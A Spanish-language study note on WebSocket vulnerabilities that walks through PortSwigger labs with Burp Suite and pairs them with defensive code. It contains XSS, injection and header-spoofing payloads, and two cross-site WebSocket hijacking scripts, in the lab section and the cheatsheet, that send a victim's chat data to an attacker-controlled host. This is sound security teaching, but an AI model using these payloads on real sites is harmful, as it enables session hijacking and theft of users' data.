---
aliases: ["WebSocket", "WebSockets", "Burp Suite WebSocket", "XSS WebSocket", "Cross-site WebSocket hijacking"]
tags:
  - sec/web
  - sec/web/websocket
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Cross-Site Request Forgery (CSRF)]]"
  - "[[Cross-Site Scripting XSS]]"
  - "[[Abuso de APIs]]"
  - "[[Inyección NoSQL]]"
  - "[[OS Command Injection]]"
fuente: "https://portswigger.net/web-security/websockets"
---

# WebSocket — Vulnerabilidades y testing con Burp Suite

**WebSocket** es un protocolo **full-duplex** sobre una sola conexión TCP: tras un *handshake* HTTP con `Upgrade`, cliente y servidor pueden enviar **frames** en cualquier momento sin el overhead de cabeceras HTTP por mensaje. Chats en vivo, notificaciones, juegos y dashboards lo usan — y por él viajan mensajes que muchas aplicaciones **no validan** como harían con un POST: los mismos bugs de XSS, inyección y CSRF (ver [[Cross-Site Scripting XSS]] y [[Cross-Site Request Forgery (CSRF)]]) reaparecen, pero en un canal que la Same-Origin Policy no cubre igual de bien.

## Mecánica: el handshake y los frames

### Handshake (HTTP → WebSocket)

```http
GET /chat HTTP/1.1
Host: app.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==    # base64 de 16 bytes aleatorios
Sec-WebSocket-Version: 13
Cookie: session=...                              # la autenticación va aquí (o en query/token)

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=   # base64(SHA1(key + GUID))
```

- `Sec-WebSocket-Key`/`Accept` solo evitan caches y proxies confundidos: **no aportan seguridad**.
- La **autenticación ocurre en el handshake**: cookies, token en query o header `Authorization`.
- `Origin`/`Sec-WebSocket-Origin`: el navegador lo envía siempre; **si el servidor no lo valida → CSWSH**.

### Frames (nivel de mensaje)

| Campo | Función | Nota de ataque |
|---|---|---|
| `FIN` | Fin del mensaje (soporta fragmentación) | Mensajes partidos para evadir filtros por longitud |
| `Opcode` | Tipo: `0x1` texto, `0x2` binario, `0x8` close, `0x9` ping, `0xA` pong, `0x0` continuation | Ocultar payload en fragmentos |
| `MASK` + clave de 4 bytes | Enmascaramiento XOR (obligatorio cliente→servidor) | Rompe firmas WAF estáticas |
| Payload | Datos (texto o JSON) | Aquí vive la inyección |

> [!info] Enmascaramiento
> Cada frame del cliente se XOR con una clave rotatoria de 4 bytes. No es criptografía: solo impide que caches/proxies intermedios reutilicen datos. Por eso un WAF basado en firmas a menudo **no ve** el payload real; Burp lo desenmascara automáticamente.

### Dónde mira Burp Suite

- **Proxy → HTTP history**: solo el handshake (`101 Switching Protocols`).
- **Proxy → WebSockets history**: la conexión viva con todos los frames enviados/recibidos.
- **Repeater**: click en una conexión WS → *Open in WebSockets message editor* → editar y reenviar frames en ambos sentidos (cliente→servidor y servidor→cliente).
- **Match/Replace o Match and Replace rules**: para inyectar cabeceras (p.ej. `X-Forwarded-For`) en cada handshake automáticamente.

## Metodología de testing de WebSockets

1. **Localizar el WS**: WebSockets history de Burp, DevTools pestaña WS, o JS (`new WebSocket(...)`, `wss://`).
2. **Mapear el protocolo de mensajes**: qué mensajes existen (`READY`, JSON con `type`/`message`, comandos), quién los envía y qué asume el servidor del cliente.
3. **Inyección en frames** (client→server): XSS (`<img ...>`), SQL/NoSQL/OS command/SSTI (ver [[SQL Injection]], [[Inyección NoSQL]], [[OS Command Injection]]) — los mensajes suelen alimentar búsquedas, chat o acciones internas.
4. **Manipular el handshake**:
   - `Origin` alterada o eliminada → ¿acepta la conexión? (prueba manual de CSWSH).
   - Quitar/añadir cabeceras de autenticación; token en query.
   - Blacklists por IP/WAF: probar `X-Forwarded-For: 127.0.0.1`, `X-Real-IP`, `X-Originating-IP`.
5. **CSWSH (cross-site hijacking)**: si el servidor autentica por cookie y no valida `Origin`, cualquier página puede abrir el WS en nombre de la víctima y **leer y escribir** mensajes.
6. **Frames del servidor** (server→client): si el servidor refleja mi mensaje a otros usuarios, mi payload es XSS stored vía WS (el filtro que desconecta al atacante no protege a los demás).

### Catálogo de pruebas por punto

| Punto | Payload típico | Buscando |
|---|---|---|
| Mensaje de chat | `<img src=x onerror=alert(1)>` | XSS reflejado a otros usuarios (si codifican `<>`: usar `onerror` sin etiqueta cerrada o entidades) |
| Campo de búsqueda | `' OR 1=1--`, `{"$gt":""}` | SQL/NoSQL en el backend |
| Comando de la app | `{"cmd":"id"}` | Command injection |
| Handshake `Origin` | `Origin: https://evil.com` o ausente | CSWSH |
| Handshake IP | `X-Forwarded-For: 127.0.0.1` | Bypass de blacklist/WAF |
| Frame fragmentado | Payload partido en continuation frames | Evasión de filtros por longitud |
| Estado del juego/app | Replay de mensajes capturados | Acciones en nombre de otros |

## Laboratorios y notas originales de clase

### Introducción original al protocolo (material de clase)

WebSocket es un protocolo de comunicación que permite la comunicación bidireccional y continua (full-duplex) entre un cliente y un servidor a través de una única conexión TCP. A diferencia del protocolo HTTP, que requiere que el cliente inicie cada interacción con el servidor y luego cierre la conexión, WebSocket mantiene un canal abierto para que ambos extremos puedan enviar y recibir datos en cualquier momento. Esta característica es ideal para aplicaciones que necesitan interacciones en tiempo real y de baja latencia, como chats, juegos multijugador o sistemas de notificación.

> [!info] Handshake de WebSocket
> La conexión WebSocket se inicia con un "handshake" HTTP. El cliente envía una petición HTTP con la cabecera `Upgrade: websocket` y `Connection: Upgrade`. Si el servidor acepta, responde con un `101 Switching Protocols` y la conexión se "actualiza" a WebSocket, permitiendo la comunicación full-duplex sobre la misma conexión TCP.

#### Laboratorios PortSwigger (notas originales de clase)

#### Lab: Manipulating WebSocket messages to exploit vulnerabilities

Parece que necesitamos explotar una vulnerabilidad de XSS a través de WebSocket.

Comenzaremos configurando Burp Suite para interceptar todo el tráfico y poder analizarlo posteriormente.

![[Pasted image 20250925212612.png]]

Observamos cómo se están procesando todas las peticiones, pero específicamente dentro de las peticiones del chat, se menciona `WebSocket`. Para visualizar estas, debemos dirigirnos al historial de `WebSocket` en Burp Suite:

![[Pasted image 20250925212809.png]]

Vemos que la comunicación del chat web está activa. Ahora intentaremos interceptar el envío de un mensaje:

![[Pasted image 20250925212917.png]]

Confirmamos que el mensaje se intercepta sin problemas. Procederemos a intentar una inyección para observar el resultado:
![[Pasted image 20250925213031.png]]

Aparentemente, está bien configurado, ya que no se ejecuta la inyección. Podemos observar cómo se está insertando el payload para intentar otras variantes:
![[Pasted image 20250925213309.png]]

Notamos que los caracteres `<` y `>` no se están interpretando correctamente; por alguna razón, se están codificando. Intentaremos forzar su procesamiento adecuado para ver qué logramos:
![[Pasted image 20250925213524.png]]

![[Pasted image 20250925213535.png]]

No observamos ningún resultado. Podemos intentar alternativas como la siguiente:

> [!tip] Bypassing HTML Encoding
> Cuando los caracteres `<` y `>` son codificados (por ejemplo, a `&lt;` y `&gt;`), se puede intentar inyectar payloads que no dependan de estos caracteres o que utilicen codificaciones alternativas (como entidades HTML numéricas o hexadecimales) si el filtro es inconsistente. En este caso, el uso de `onerror` en una etiqueta `img` sin cerrar puede ser efectivo si el navegador intenta renderizarla.

![[Pasted image 20250925213623.png]]

![[Pasted image 20250925213641.png]]

¡Perfecto! Esto sí ha funcionado:

![[Pasted image 20250925213657.png]]

#### Lab Terminado.

#### Lab: Cross-site WebSocket hijacking

Volvemos a encontrarnos con un chat en vivo. En este laboratorio, utilizaremos el exploit server para configurar nuestro código JavaScript malicioso:

Analizaremos el tráfico:
![[Pasted image 20250925214111.png]]

Por lo que se entiende, la secuencia es enviar el mensaje `READY` y luego iniciar la comunicación con los mensajes.

Con lo anterior claro, nuestro código para este ataque sería el siguiente:
```html
<script>
var ws = new WebSocket("https://0a250004047b3030806844f000840052.web-security-academy.net/chat");

ws.onopen = function () {
  ws.send("READY");
};

ws.onmessage = function () {
  fetch("https://exploit-0af400560405302a807943c6019b00a6.exploit-server.net/?data=" + btoa(event.data));
};
</script>
```

> [!info] Cross-site WebSocket Hijacking (CSWSH)
> A diferencia de las peticiones AJAX, los WebSockets no están sujetos a la Same-Origin Policy (SOP) de la misma manera estricta para el inicio de la conexión. Un atacante puede iniciar una conexión WebSocket a un dominio diferente desde una página controlada por el atacante. Si el servidor WebSocket confía en las cookies de sesión para la autenticación y no valida el `Origin` header, un usuario autenticado que visite la página del atacante podría ser víctima de un secuestro de sesión a través de WebSocket. El atacante podría entonces leer o enviar mensajes en nombre del usuario.

![[Pasted image 20250925214733.png]]

Enviaremos esto a la víctima y verificaremos si recibimos la información en los logs:
![[Pasted image 20250925214817.png]]

¡Perfecto! Observamos datos transmitidos en Base64. Procederemos a decodificarlos a texto normal en la consola:

![[Pasted image 20250925215208.png]]

Confirmamos que ya tenemos la contraseña de Carlos:

![[Pasted image 20250925215244.png]]

#### Lab Terminado.

#### Lab: Manipulating the WebSocket handshake to exploit vulnerabilities

En este laboratorio, explotaremos una vulnerabilidad de XSS con el objetivo de ejecutar una función `alert()`.

Como ya vimos en el caso anterior, donde funcionó la manipulación de etiquetas interceptando con Burp Suite, intentaremos esa misma aproximación inicialmente:

![[Pasted image 20250925215643.png]]

Al intentarlo, nos desconecta y, finalmente, nos añade a una lista negra (blacklist), impidiéndonos incluso ver el chat:
![[Pasted image 20250925215711.png]]

En este punto, podemos interceptar la petición e intentar utilizar cabeceras conocidas para eludir esta restricción:
![[Pasted image 20250925215820.png]]

> [!info] Bypassing Blacklists/WAFs with HTTP Headers
> Algunos sistemas de seguridad o WAFs pueden bloquear peticiones basándose en la IP de origen o en patrones específicos en el cuerpo/cabeceras. Utilizar cabeceras como `X-Forwarded-For`, `X-Originating-IP`, `X-Remote-IP`, `X-Client-IP` o `Client-IP` con una IP diferente (como `127.0.0.1` o una IP interna) puede engañar al servidor para que piense que la petición proviene de una fuente de confianza o interna, eludiendo así las restricciones de la lista negra.

Observamos que esto funciona, pero tendríamos que editar todas las peticiones para añadir la cabecera, lo cual no es óptimo. Configuraremos el proxy de la siguiente manera:
![[Pasted image 20250925220057.png]]

Con esta configuración, debería estar funcionando de nuevo:

![[Pasted image 20250925220141.png]]

Volveremos a intentar lo mismo, pero representado de otra manera, que sería la siguiente:

![[Pasted image 20250925220318.png]]

![[Pasted image 20250925220331.png]]

Nos vuelve a detectar, pero en esta ocasión, directamente nos muestra `Alert`. Es posible que esto no sea del agrado del sistema; intentaremos de otra forma:
![[Pasted image 20250925220510.png]]

En este caso, intentaremos sin los paréntesis. La forma correcta es como se muestra en la imagen. Procederemos a intentarlo:

![[Pasted image 20250925220554.png]]

¡Eso le gustó! Ahora sí, verificaremos si el laboratorio se ha completado:
![[Pasted image 20250925220619.png]]

#### Lab Terminado.
## Detección

| Señal | Riesgo |
|---|---|
| Handshake aceptado con `Origin` arbitraria o ausente | CSWSH |
| Cookie de sesión válida para abrir el WS | Autenticación por cookies sin binding de origen |
| Mensajes reflejados a otros usuarios sin codificar | XSS stored vía WS |
| Búsqueda/acción por WS que varía con payloads | Injection en frames |
| Filtro que desconecta y banea tras ver `<>` (blacklist) | Lista negra eludible por IP/header |
| Replay de un frame capturado produce la misma acción | Falta de nonce/anti-replay |

## Impacto y riesgo

- **CSWSH = account takeover parcial o total**: leer el chat o los datos que el servidor envía a la víctima (el lab exfila en base64 mensajes con la contraseña de Carlos) y enviar acciones en su nombre — no existen tokens CSRF en WS.
- **XSS stored multiusuario**: un frame malicioso se refleja a todos los conectados (ver [[Cross-Site Scripting XSS]]).
- **Bypass de WAF/blacklists** para explotar otras inyecciones (SQL/NoSQL/command) por el canal WS.
- Robo de información en tiempo real: posiciones, precios, mensajes privados.

## Defensa (con código)

### 1. Validar `Origin` en el handshake (mitiga CSWSH)

```javascript
// Node.js (ws) — ✅ allowlist de orígenes + auth antes del 101
const wss = new WebSocket.Server({ noServer: true });
server.on("upgrade", (req, socket, head) => {
  if (!ORIGINS.has(req.headers.origin)) return socket.destroy();
  const user = authenticate(req);           // cookie/token verificado server-side
  if (!user) return socket.destroy();
  wss.handleUpgrade(req, socket, head, (ws) => attach(ws, user));
});
// ❌ new WebSocket.Server({ server }) — acepta a cualquiera y confía en la cookie
```

```python
# Python (websockets)
async def handler(ws, path):
    if ws.request_headers.get("Origin") not in ALLOWED:
        await ws.close(code=1008)   # policy violation
```

### 2. Autenticar el socket con tokens, no solo cookies

- Exigir token de un solo uso en el handshake (`?token=` o header `Authorization`) validado server-side: así una página cross-site no puede autenticarse con las cookies de la víctima.
- Combinar con validación de `Origin` (defensa en capas).

### 3. Tratar cada mensaje como una entrada no confiable

```javascript
// ❌ broadcast(msg) crudo al DOM de otros
const clean = sanitizeHtml(msg.text);          // escaping context-aware (ver XSS)
if (!VALID_TYPES.has(msg.type)) return;        // allowlist de tipos de mensaje
db.insertMessage({ user: ws.user.id, text: clean });
broadcast({ type: "msg", text: clean });       // nunca reenviar HTML crudo
```

- Validar contra schema (JSON Schema/zod) cada frame; rate limiting y límites de tamaño por conexión.
- No confiar en el `MASK` del frame como protección: es anti-caching, no seguridad.

### 4. Acciones state-changing sin CSRF-equivalente

Requerir confirmación o token por mensaje para acciones sensibles; cerrar la conexión ante origen desconocido; aplicar los mismos controles que a un POST (ver [[Cross-Site Request Forgery (CSRF)]]).

## Errores comunes

**Atacante:**
1. Mirar solo HTTP history: los frames de WS no están ahí → perderse el vector completo.
2. Esperar que un payload con `<>` funcione si el servidor codifica HTML; probar variantes (atributos sin etiqueta cerrada, entidades, otros contextos).
3. Probar CSWSH solo con `Origin` de otro subdominio y no sin cabecera.
4. Ignorar el handshake: la sesión/token nuevo suelen estar ahí.

**Defensor:**
1. Asumir "WS es tan seguro como HTTP": sin SOP efectiva, sin CSRF tokens, sin validación de mensajes.
2. Broadcast crudo de mensajes (XSS stored garantizado si aparece un `<`).
3. Autenticar WS solo por cookie sin validar `Origin`.
4. "Banear" por IP en vez de sanitizar (eludible con `X-Forwarded-For`).

## Cheatsheet

```http
# Handshake manual
GET /chat HTTP/1.1
Host: app.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://evil.com            # prueba de CSWSH
```

```javascript
// CSWSH exploit (exploit server)
var ws = new WebSocket("wss://APP/chat");
ws.onopen = () => ws.send("READY");
ws.onmessage = e => new Image().src = "https://EVIL/?d=" + btoa(e.data);
```

```bash
# Burp: Proxy → WebSockets history → click en la conexión → pestaña Messages
# Repeater: Open in WebSockets message editor → Edit and replay
# Bypass de blacklist: Match/Replace en Repeater
#   X-Forwarded-For: 127.0.0.1
```

## Laboratorios y referencias

- PortSwigger Academy — WebSockets: https://portswigger.net/web-security/websockets
- MDN — WebSockets API: https://developer.mozilla.org/es/docs/Web/API/WebSockets_API
- RFC 6455 (The WebSocket Protocol): https://datatracker.ietf.org/doc/html/rfc6455
- HackTricks — WebSocket pentesting: https://book.hacktricks.wiki/en/pentesting-web/websocket-pentesting.html

## Relacionadas

- [[Cross-Site Request Forgery (CSRF)]] — la same-origin policy que WS no respeta bien; el `state`/token que WS no trae
- [[Cross-Site Scripting XSS]] — el impacto típico de un frame reflejado a otros usuarios
- [[Abuso de APIs]] — WS como API de mensajes: mismas reglas de validación
- [[Inyección NoSQL]] y [[OS Command Injection]] — inyecciones trasladadas a frames
- [[SQL Injection]] — búsqueda por WS contra backend SQL
